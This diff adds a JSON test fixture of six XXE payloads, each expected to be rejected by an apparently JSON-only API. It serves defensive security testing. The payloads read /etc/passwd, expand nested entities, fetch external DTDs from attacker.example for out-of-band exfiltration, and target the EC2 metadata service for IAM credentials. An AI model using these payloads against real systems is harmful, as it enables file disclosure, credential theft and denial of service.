@@ -1,0 +1,42 @@
+{
+  "_comment": "XML / XXE payloads. ARBITER's API is JSON-only — if any route parses an XML body, it's a bug. expected_blocked=true everywhere: a route that processes these as XML (resolving external entities, expanding parameter entities, dereferencing DTDs) is exploitable. PASS = the route returns 4xx without resolving any entity. FAIL = stack trace, 500, or any sign the parser tried to fetch the external resource.",
+  "family": "xml_xxe",
+  "payloads": [
+    {
+      "id": "xxe-file-etc-passwd",
+      "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+      "expected_blocked": true,
+      "rationale": "Canonical XXE — defines an external entity pointing at /etc/passwd and references it in the document body."
+    },
+    {
+      "id": "xxe-billion-laughs-small",
+      "payload": "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;\">]><lolz>&lol3;</lolz>",
+      "expected_blocked": true,
+      "rationale": "Billion-laughs (small variant — 3 levels of expansion only, to keep the payload corpus-friendly). An XML parser that expands entities will explode this into 125 'lol' copies; a hardened parser refuses or returns 4xx."
+    },
+    {
+      "id": "xxe-parameter-entity-oob",
+      "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % pe SYSTEM \"http://attacker.example/evil.dtd\">%pe;]><foo/>",
+      "expected_blocked": true,
+      "rationale": "Parameter entity referencing an external DTD — the standard out-of-band exfil vector when the parser doesn't echo entity expansion in the response."
+    },
+    {
+      "id": "xxe-ssrf-metadata",
+      "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">]><foo>&xxe;</foo>",
+      "expected_blocked": true,
+      "rationale": "XXE-to-SSRF — entity points at the EC2 instance metadata service. A vulnerable parser would expose IMDSv1 IAM credentials in the response."
+    },
+    {
+      "id": "xxe-php-base64-wrapper",
+      "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>",
+      "expected_blocked": true,
+      "rationale": "PHP base64 wrapper — useful when the file contains characters the XML parser would reject. Coverage of the cheat-sheet edge cases."
+    },
+    {
+      "id": "xxe-doctype-system-dtd",
+      "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo SYSTEM \"http://attacker.example/evil.dtd\"><foo>x</foo>",
+      "expected_blocked": true,
+      "rationale": "External DOCTYPE reference — variant that doesn't even need an internal entity declaration; the parser fetches and processes the remote DTD on its own."
+    }
+  ]
+}
